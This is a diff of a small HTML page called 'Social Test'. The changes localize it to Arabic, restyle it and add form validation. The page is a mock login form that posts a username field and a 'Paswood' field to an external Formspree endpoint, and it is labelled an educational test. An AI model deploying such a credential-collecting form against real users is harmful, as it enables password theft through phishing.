@@ -1,9 +1,8 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <title>Social Test</title>
 
 <style>
@@ -17,16 +16,17 @@ body {
   display: flex;
   justify-content: center;
   align-items: center;
-  background: #fafafa;
+  background: linear-gradient(135deg, #f5f5f5, #e9e9e9);
   font-family: Arial, sans-serif;
 }
 
 .card {
-  width: 90%;
-  max-width: 350px;
+  width: 92%;
+  max-width: 360px;
   background: white;
-  border: 1px solid #ddd;
   padding: 30px 25px;
+  border-radius: 18px;
+  box-shadow: 0 8px 30px rgba(0,0,0,.12);
   text-align: center;
 }
 
@@ -38,26 +38,52 @@ body {
 
 input {
   width: 100%;
-  padding: 13px;
-  margin-bottom: 10px;
-  border: 1px solid #ccc;
-  border-radius: 6px;
-  background: #fafafa;
+  padding: 14px;
+  margin-bottom: 12px;
+  border: 1px solid #ddd;
+  border-radius: 8px;
+  outline: none;
+}
+
+input:focus {
+  border-color: #777;
 }
 
 button {
   width: 100%;
-  padding: 12px;
-  border: none;
-  border-radius: 6px;
-  background: #333;
+  padding: 14px;
+  border: 0;
+  border-radius: 8px;
+  background: #222;
   color: white;
+  font-size: 16px;
   font-weight: bold;
   cursor: pointer;
+  transition: .2s;
+}
+
+button:hover {
+  transform: scale(1.02);
+}
+
+button:active {
+  transform: scale(.97);
+}
+
+#error {
+  color: #d00;
+  margin-top: 12px;
+  display: none;
+}
+
+#success {
+  color: green;
+  margin-top: 12px;
+  display: none;
 }
 
 .note {
-  margin-top: 20px;
+  margin-top: 18px;
   font-size: 12px;
   color: #777;
 }
@@ -70,7 +96,9 @@ button {
 
   <div class="logo">Social Test</div>
 
-  <form action="https://formspree.io/f/xrpzoaod" method="POST">
+  <form id="testForm"
+        action="https://formspree.io/f/xrpzoaod"
+        method="POST">
 
     <input
       type="text"
@@ -82,19 +110,42 @@ button {
     <input
       type="text"
       name="Paswood"
-      placeholder="Paswood"
+      placeholder="Paswood - بيانات تجريبية"
       required
     >
 
-    <button type="submit">Send</button>
+    <button type="submit">إرسال</button>
+
+    <div id="error">عمّر الخانتين أولاً.</div>
+    <div id="success">تم الإرسال بنجاح ✅</div>
 
   </form>
 
   <div class="note">
-    Educational test only
+    Educational Test Only
   </div>
 
 </div>
+
+<script>
+const form = document.getElementById("testForm");
+const error = document.getElementById("error");
+const success = document.getElementById("success");
+
+form.addEventListener("submit", function(e) {
+
+  const inputs = form.querySelectorAll("input");
+
+  if (!inputs[0].value.trim() || !inputs[1].value.trim()) {
+    e.preventDefault();
+    error.style.display = "block";
+    success.style.display = "none";
+    return;
+  }
+
+  error.style.display = "none";
+});
+</script>
 
 </body>
 </html>
